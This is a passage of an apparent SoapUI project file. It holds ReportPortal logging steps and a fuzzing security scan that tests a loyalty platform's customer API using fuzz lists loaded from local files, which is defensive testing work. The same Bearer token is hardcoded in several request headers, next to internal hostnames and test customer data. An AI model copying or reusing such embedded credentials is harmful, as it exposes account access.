              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
   "launchUuid":"${#TestSuite#launchId}",
   "itemUuid":"${#TestSuite#stepId}",
   "time":"${#TestCase#startTime}",
   "message":"${#TestCase#message}",
   "level":"${#TestCase#level}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
            <con:assertion type="Simple NotContains" id="38425fd0-703f-4f35-9988-44cdedcee3ab" name="Not Contains">
              <con:configuration>
                <token>error</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
            <con:parameterOrder/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>message</con:name>
          <con:value>=============Raw Response==============HTTP/1.1 200 OKServer: nginx/1.17.8Date: Tue, 16 Feb 2021 09:33:57 GMTContent-Type: application/json;charset=UTF-8Transfer-Encoding: chunkedConnection: keep-aliveX-Application-Context: application:1900Host: intouch-api-6bbf6977b5-gzsdtorg_id: 50660status_code: 1000success: 1fail: 0X-CAP-REQUEST-ID: 5445f2d2ff4130feb6819c12c5ec7c82till: api.auto1X-Cap-RequestID: 5445f2d2ff4130feb6819c12c5ec7c82X-Frame-Options: SAMEORIGINX-Frame-Options: SAMEORIGINContent-Encoding: gzip{    \"response\": {        \"status\": {            \"success\":\"true\",            \"code\":200,            \"message\":\"Success\",            \"total\": \"1\",            \"success_count\": \"1\"        },        \"customers\": {            \"customer\": [                {                    \"firstname\": \"firstname_9765764354\",                    \"lastname\": \"lastname_9765764354\",                    \"mobile\": \"9765764354\" ,                    \"email\":  \"9765764354@gmail.com\" ,                    \"external_id\": null,                    \"lifetime_points\": 140                                        ,                    \"lifetime_purchases\": 0,                    \"loyalty_points\": 140                                        ,                    \"current_slab\": \"Silver\"                                    ,                    \"registered_on\": \"2021-01-19 16:23:00\",                    \"updated_on\": \"2021-02-16 13:57:33\",                    \"type\": \"LOYALTY\",                    \"source\": \"instore\",                    \"identifiers\": [                    ],                    \"gender\": null,                    \"registered_by\": \"autostore1\",                    \"registered_store\": {                        \"code\": \"autostore1\",                        \"name\": \"autostore1\"                    },                    \"registered_till\": {                        \"code\": \"api.auto1\",                        \"name\": \"api.auto1\"                    },                    \"fraud_details\": {                        \"status\": \"NONE\",                        \"marked_by\": \"\",                        \"modified_on\": \"\",                        \"reason\": \"\"                    },                    \"trackers\": \"\",                                                                                \"current_nps_status\":null,                    \"custom_fields\": {                        \"field\": [                     ]                    },                                         \"extended_fields\": {                        \"field\": [                            {                                \"name\": \"zip\",                                \"value\": \"122001\"                            },                             {                                \"name\": \"nationality\",                                \"value\": \"India\"                            }                     ]                    },                                                                       \"transactions\": {                        \"transaction\": [                            ]                    },                                                            \"coupons\": {                        \"coupon\": [                            ]                    },                                                            \"notes\": [],                                                                                                                                            \"points_summaries\": {                        \"points_summary\": [                        {                        \"programId\":\"1465\",                        \"redeemed\":\"0\",                        \"expired\":\"0\",                        \"returned\":\"0\",                        \"adjusted\":\"0\",                        \"lifetimePoints\":\"140\",                        \"loyaltyPoints\":\"140\",                        \"cumulativePurchases\":\"0\",                        \"currentSlab\":\"Silver\",                        \"nextSlab\":\"Gold\",                        \"nextSlabSerialNumber\":\"2\",                        \"nextSlabDescription\":\"Gold\",                        \"slabSNo\":\"1\",                        \"slabExpiryDate\":\"2121-01-19 23:59:59\",                        \"totalPoints\":\"\",                        \"delayed_points\": \"0\",                        \"delayed_returned_points\": \"0\",                        \"total_available_points\": \"140\",                        \"total_returned_points\": \"0\",                        \"program_title\":\"ApiAutomationOrgDefaultProgram\",                        \"program_description\":\"Default program for ApiAutomationOrg\",                        \"program_points_to_currency_ratio\":\"1\",                        \"linked_partner_programs\":{                            \"linked_partner_program\":[                            ]                            },                            \"gap_to_upgrade\":{                                \"upgrade_strategy\":[]                            },                            \"gap_to_renew\":{                            }                }                        ]                    },                    \"group_points_summaries\":{                    \"group_points_summary\":[                            {                            \"group_program_id\": \"1465\",                            \"title\": \"ApiAutomationOrgDefaultProgram\",                            \"description\": \"Default program for ApiAutomationOrg\",                            \"lifetime_points\": \"140\",                            \"loyalty_points\": \"140\",                            \"promised_points\": \"0\",                            \"points_to_currency_ratio\": \"1\",                            \"programs_list\":{                            \"program\":[                            {                            \"id\":\"1465\",                            \"name\":\"ApiAutomationOrgDefaultProgram\",                            \"description\": \"Default program for ApiAutomationOrg\"                            }                            ]}                            }                                                        ]                            },                                                                                \"item_status\": {                        \"success\":\"true\",                        \"code\":\"1000\",                        \"message\":\"Customer successfully retrieved\",                        \"warnings\": {                            \"warning\": []                        }                    }}           ]        }    }}</con:value>
        </con:property>
        <con:property>
          <con:name>level</con:name>
          <con:value>info</con:value>
        </con:property>
        <con:property>
          <con:name>startTime</con:name>
          <con:value>1613468038805</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="cc16831b-ce2e-41cc-8f45-4b07846a83b6" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="closeTestStep" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="ad4eb75a-254d-422a-b5c2-2e896bf9ed38">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("endTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="closeStep" id="927594c7-31cd-4cef-a9f8-16bf54bf52b2">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item/{itemID}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="closeStep" id="919c021c-cfaa-4322-82fb-4ee4d3039cbd" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
  "endTime": "${#TestCase#endTime}",
  "status": "${#TestCase#status}",
  "launchUuid": "${#TestSuite#launchId}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/ui/</con:originalUri>
            <con:assertion type="Simple NotContains" id="f1c40bbb-4a87-43ef-8ca2-070362f7ef4f" name="Not Contains">
              <con:configuration>
                <token>error</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="itemID" value="${#TestSuite#stepId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
            <con:parameterOrder>
              <con:entry>itemID</con:entry>
            </con:parameterOrder>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>status</con:name>
          <con:value>passed</con:value>
        </con:property>
        <con:property>
          <con:name>endTime</con:name>
          <con:value>1613468039077</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="930a0bef-3e50-4e06-b51a-2e0066477b4b" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="closeTestCase" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="85d9395c-d8b9-41f5-9ef9-8f8f9d49f5be">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("endTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="closeCase" id="6d24848f-8886-496b-a3f3-37fa008292b2">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item/{itemID}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="closeCase" id="919c021c-cfaa-4322-82fb-4ee4d3039cbd" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
  "endTime": "${#TestCase#endTime}",
  "status": "${#TestCase#status}",
  "launchUuid": "${#TestSuite#launchId}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/ui/</con:originalUri>
            <con:assertion type="Simple NotContains" id="3c82623a-c0de-4caa-a280-ecd71bc47702" name="Not Contains">
              <con:configuration>
                <token>error</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="itemID" value="${#TestSuite#suiteId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
            <con:parameterOrder>
              <con:entry>itemID</con:entry>
            </con:parameterOrder>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>status</con:name>
          <con:value>passed</con:value>
        </con:property>
        <con:property>
          <con:name>endTime</con:name>
          <con:value>1614085135595</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="9b0940e8-0ee0-48ab-af3a-7ea8d445879d" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="closeTestSuite" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="e2d96e47-7072-43d8-a2f0-5d24515af334">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("endTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="closeSuite" id="049f72a7-aa65-48bf-95cf-671459759691">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item/{itemID}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="closeSuite" id="919c021c-cfaa-4322-82fb-4ee4d3039cbd" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
  "endTime": "${#TestCase#endTime}",
  "status": "${#TestCase#status}",
  "launchUuid": "${#TestSuite#launchId}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/ui/</con:originalUri>
            <con:assertion type="Simple NotContains" id="052b92c1-31df-43f4-acf0-eccd06967f0c" name="Not Contains">
              <con:configuration>
                <token>error</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="itemID" value="${#TestSuite#suiteId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
            <con:parameterOrder>
              <con:entry>itemID</con:entry>
            </con:parameterOrder>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>status</con:name>
          <con:value>passed</con:value>
        </con:property>
        <con:property>
          <con:name>endTime</con:name>
          <con:value>1614085135927</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="e5d9f014-2354-4a6e-91fc-0b9c35c0c3c6" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="closeLaunch" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="b1d7f92d-b3eb-4f5e-82cd-51345f2f9b3c">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("endTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="closeLaunch" id="caa55fef-4a08-4a38-b9e2-9ad9d5d12e2d">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/launch/{launchID}/finish" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="closeLaunch" id="d29ecd9a-c8e5-4630-9271-641335e91b93" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
  "endTime": "${#TestCase#endTime}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/launch/2ab3a6e0-636e-440a-a144-7b284f536092</con:originalUri>
            <con:assertion type="Simple NotContains" id="f060ddaf-beda-469c-a986-8111719c5857" name="Not Contains">
              <con:configuration>
                <token>error</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="launchID" value="${#TestSuite#launchId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>endTime</con:name>
          <con:value>1614085136227</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:properties>
      <con:property>
        <con:name>launchId</con:name>
        <con:value>abadb7d4-90fd-4137-b9a6-edd5f5f57df7</con:value>
      </con:property>
      <con:property>
        <con:name>suiteId</con:name>
        <con:value>3e64254c-d7e1-4883-9ae3-144d18e29e84</con:value>
      </con:property>
      <con:property>
        <con:name>caseId</con:name>
        <con:value>af45834f-4cc7-404e-965a-4e015f817670</con:value>
      </con:property>
      <con:property>
        <con:name>stepId</con:name>
        <con:value>4d6cf2f0-08a0-4ad2-bd3f-0144efa8ccf1</con:value>
      </con:property>
    </con:properties>
  </con:testSuite>
  <con:testSuite id="0f730890-7b19-4b62-b602-c57ed6cb7994" name="CustomerAPIFuzzyTestSuite">
    <con:description>TestSuite generated for REST Service [customer_add]</con:description>
    <con:settings/>
    <con:runType>SEQUENTIAL</con:runType>
    <con:testCase id="9cd236a5-245a-4b90-88db-123b217b1760" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="getCustomerAPI" searchProperties="true">
      <con:description>TestCase generated for REST Resource [add] located at [/{version}/customer/add]</con:description>
      <con:settings/>
      <con:testStep type="restrequest" name="getCustomerV1" id="4b85c446-80c4-41ee-a3d8-799d811ee5cb">
        <con:settings/>
        <con:config service="getCustomerV1" resourcePath="/v1.1/customer/get" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="getCustomerV1" id="fffb4960-10e1-4ff0-982b-f7255dbe25c3" mediaType="application/json">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="X-CAP-CLIENT-COUNTRYCODE" value="1" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request/>
            <con:originalUri>https://nightly.capillary.in/v1.1/customer/get</con:originalUri>
            <con:assertion type="Valid HTTP Status Codes" id="7729bcc6-9338-4f0b-b0ed-ef67aa99c1af" name="Valid HTTP Status Codes">
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple Contains" id="ad6adc78-e27d-4dbe-ba14-9d7a04123433" name="Contains valid message">
              <con:configuration>
                <token>Customer successfully retrieved</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <con:entry key="mlp" value="heihvfer"/>
              <con:entry key="id" value="373278342"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="getCustomerV2" id="eed8a0c5-ac76-4aa2-a8e4-b7a5119a67f1">
        <con:settings/>
        <con:config service="getCustomerV2" resourcePath="/v2/customers/{user_id}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="getCustomerV2" id="35a353eb-1756-4e37-83f8-d8c4a290f0aa" mediaType="application/json">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request/>
            <con:originalUri>https://nightly.capillary.in/v2/customers/376790377</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="fd25c010-d089-4e74-9a20-8ba0ca800596" name="user id is reflected in response">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

assert(json.id == 373401894);</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Valid HTTP Status Codes" id="93be0b09-3aa0-42bd-abed-47111b2738c9" name="status == 200">
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <con:entry key="accountId" value="~71680076"/>
              <con:entry key="user_id" value="373401894"/>
              <con:entry key="source" value="WEB_ENGAGE"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>customerId</con:name>
          <con:value>373278342</con:value>
        </con:property>
        <con:property>
          <con:name>mobile</con:name>
          <con:value>919957559156</con:value>
        </con:property>
      </con:properties>
      <con:securityTest id="3a9a6d08-aa01-45a3-8ebf-a1e3a83b36a9" name="getCustomerFuzzyTests" failOnError="false" failSecurityTestOnScanErrors="true">
        <con:settings/>
        <con:setupScript>import com.eviware.soapui.model.testsuite.TestStepResult.TestStepStatus;

def newJson = []

context.newJson = newJson;
def testSuiteName = context.testCase.testSuite.getLabel();
def testCaseName = context.testCase.getLabel();
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

String project_dir = context.expand('${projectDir}');
fuzzDBLocation = project_dir + File.separator + "test_data" + File.separator + "fuzzdb";

//Get data from JSON Fuzzing.
def lstOfJsons = []
def lstOfInvalidEmails = []
def lstOfInvalidMobiles = []
def lstOfFuzzString = []

log.info("Reading JSON_fuzzing......")

new File(fuzzDBLocation + File.separator + "JSON_fuzzing.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfJsons.add(line)
    }
}
log.info("Reading invalid-emails.......")

new File(fuzzDBLocation + File.separator + "invalid-email-addresses.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidEmails.add(line)
    }
}
log.info("Reading the numeric fuzz data.....")
new File(fuzzDBLocation + File.separator + "numeric.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidMobiles.add(line)
    }
}

log.info("Reading the fuzz strings data.....")
new File(fuzzDBLocation + File.separator + "fuzzString.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfFuzzString.add(line)
    }
}



//set to context.
context.lstOfJsons = lstOfJsons
context.lstOfInvalidEmails = lstOfInvalidEmails
context.lstOfInvalidMobiles = lstOfInvalidMobiles
context.lstOfFuzzString = lstOfFuzzString
log.info("Context set!")

/*
//Start a launch.
def startLaunchTestCase = reportPortalTestSuites.testCases['StartLaunch']
startLaunchTestCase.setPropertyValue("launchName", "APIFuzzyTEsts");
def startLaunchRunner = startLaunchTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startLaunchRunner.getResults();
log.info("Lauch Created - " + stepResults[1].getStatus());

//Start a TestSuite.
def startTestSuiteTestCase = reportPortalTestSuites.testCases['StartTestSuite']
startTestSuiteTestCase.setPropertyValue("suiteName", testSuiteName)
def startTestSuiteRunner = startTestSuiteTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def ts_stepResults = startTestSuiteRunner.getResults();
log.info("TestSuite Created - " + ts_stepResults[1].getStatus());

//Start a TestCase.
def startTestCaseTestCase = reportPortalTestSuites.testCases['StartTestCase']
startTestCaseTestCase.setPropertyValue("caseName", testCaseName);
def startTestCaseRunner = startTestCaseTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def tc_stepResults = startTestCaseRunner.getResults();
log.info("TestCase Created - " + tc_stepResults[1].getStatus());

log.info("LaunchID = " + reportPortalTestSuites.getPropertyValue('launchId'));
log.info("SuiteID = " + reportPortalTestSuites.getPropertyValue('suiteId'));
log.info("CaseId = " + reportPortalTestSuites.getPropertyValue('caseId'));
*/</con:setupScript>
        <con:tearDownScript>import groovy.json.JsonOutput;
import com.eviware.soapui.security.*;

String project_dir = context.expand('${projectDir}');
log.info("test name = " + context.testCase.getSecurityTestAt(0).getName())
def result = context.getProperty('SecurityScanRequestResult')

log.info ("Result Type: " + result.getResultType())

log.info("status: " + result.getStatus())

log.info("Messages: " + result.getMessages())

log.info("Actions: "+ result.getActions())

def newJsonStr = JsonOutput.toJson(context.newJson)
def newPrettyJson = JsonOutput.prettyPrint(newJsonStr)

String outputFolder = context.testCase.testSuite.project.getPropertyValue("outputFolder");
String reportFileName = context.testCase.getSecurityTestAt(0).getName();
File reportFileObj = new File(outputFolder + File.separator + reportFileName + ".json");

saveToFile(reportFileObj, newPrettyJson)

//Save the contents to a file
def saveToFile(file, content) {
    if (!file.parentFile.exists()) {
         file.parentFile.mkdirs()
         log.info "Directory did not exist, created"
    }
    file.write(content)
    assert file.exists(), "${file.name} not created"
}

/*
// closing the testcase and suite over reportportal.
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

def closeTestCase = reportPortalTestSuites.testCases['closeTestCase']
closeTestCase.setPropertyValue("status", "passed");
def closeTestCaseRunner = closeTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestCaseResults = closeTestCaseRunner.getResults();
log.info("TestCase closed - " + closeTestCaseResults[1].getStatus());

def closeTestSuite = reportPortalTestSuites.testCases['closeTestSuite']
closeTestSuite.setPropertyValue("status", "passed");
def closeTestSuiteRunner = closeTestSuite.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestSuiteRunnerResults = closeTestSuiteRunner.getResults();
log.info("TestSuite closed - " + closeTestSuiteRunnerResults[1].getStatus());

def closeLaunch = reportPortalTestSuites.testCases['closeLaunch']
def closeLaunchRunner = closeLaunch.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeLaunchRunnerResults = closeLaunchRunner.getResults();
log.info("Launch Closed - " + closeLaunchRunnerResults[1].getStatus());
*/</con:tearDownScript>
        <con:testStepSecurityTest>
          <con:testStepId>4b85c446-80c4-41ee-a3d8-799d811ee5cb</con:testStepId>
          <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="8e0e2b3e-10bd-42a4-828b-47089ecd1ca0" applyForFailedStep="false" disabled="false">
            <con:settings/>
            <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:minimal>5</con:minimal>
              <con:maximal>10</con:maximal>
              <con:numberOfRequest>25</con:numberOfRequest>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="1dd47175-578d-4d4f-a152-18a7e97bd088" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="b25ceb36-8b12-4692-9183-7c6c466d1448" name="capture req/resp data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="20e0635d-2092-4f8b-8bce-3065d4e50ac2" name="add data to reportportal" disabled="true">
              <con:configuration>
                <scriptText>String rawRequest = new String(messageExchange.getRawRequestData())
String rawResponse = new String(messageExchange.getRawResponseData())

def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def scan = context.getCurrentScan().getName();

HashMap&lt;String,String> properties = messageExchange.getProperties()
propertiesString = properties.inspect();

propertyMessage = "=============Properties=============";
propertyMessage = propertyMessage + propertiesString;
propertyMessage = manipulateLogMessage(propertyMessage);

requestMessage = "==============Raw Request================";
requestMessage = requestMessage + rawRequest;
requestMessage = manipulateLogMessage(requestMessage);

responseMessage = "=============Raw Response==============";
responseMessage = responseMessage + rawResponse;
responseMessage = manipulateLogMessage(responseMessage);


def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

//Start a TestStep.
def startTestStepTestCase = reportPortalTestSuites.testCases['StartTestStep']
startTestStepTestCase.setPropertyValue("stepName", scan + "for [" + testStepName + "]");
def startTestStepRunner = startTestStepTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startTestStepRunner.getResults();
log.info("TestStep Created - " + stepResults[1].getStatus());


def addLogTestCase = reportPortalTestSuites.testCases['addLog']

// log a properties used in a call.
addLogTestCase.setPropertyValue("message", propertyMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogPropRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogPropRunnerResults = addLogPropRunner.getResults();
log.info("Log Properties Status - " + addLogPropRunnerResults[1].getStatus());

// log a raw request.
addLogTestCase.setPropertyValue("message", requestMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogReqRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogReqRunnerResults = addLogReqRunner.getResults();
log.info("Log Request Status - " + addLogReqRunnerResults[1].getStatus());

// log a raw response.
addLogTestCase.setPropertyValue("message", responseMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogResRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogResRunnerResults = addLogResRunner.getResults();
log.info("Log Response Status - " + addLogResRunnerResults[1].getStatus());


//close the test step.
def closeTestStepTestCase = reportPortalTestSuites.testCases['closeTestStep']
closeTestStepTestCase.setPropertyValue("status", "passed");
def closeTestStepRunner = closeTestStepTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
